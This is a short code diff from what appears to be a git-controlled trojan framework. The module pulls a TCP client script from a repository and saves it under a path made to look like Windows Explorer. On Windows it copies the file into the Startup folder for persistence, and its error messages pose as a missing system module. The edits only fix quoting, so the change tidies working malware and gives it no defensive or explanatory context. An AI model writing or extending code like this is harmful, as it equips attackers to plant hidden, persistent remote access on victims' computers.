@@ -48,7 +48,7 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 		scriptPath = "scripts/TCP_client.py"
 		ScriptExec = "python"
 		TargetScript = os.getenv("PUBLIC")+ "\explorer_win"
-		cmd = ScriptExec+" '"+TargetScript+"'"
+		cmd = ScriptExec+" "+TargetScript
 	else:
 		return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)
 	script	= get_file_contents(scriptPath)
@@ -60,7 +60,7 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 			fich.close()
 			if os.name == 'nt' and winRunOnBoot == True:
 				startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
-				os.system("copy %s %s"%(TargetScript, startPath))
+				os.system("copy \"%s\" \"%s\""%(targetPath, startPath))
 		except:
 			print("[Error] RunScriptFromGit: could not create Targetscript")
 			return " modules/_bootlocale not found!!"
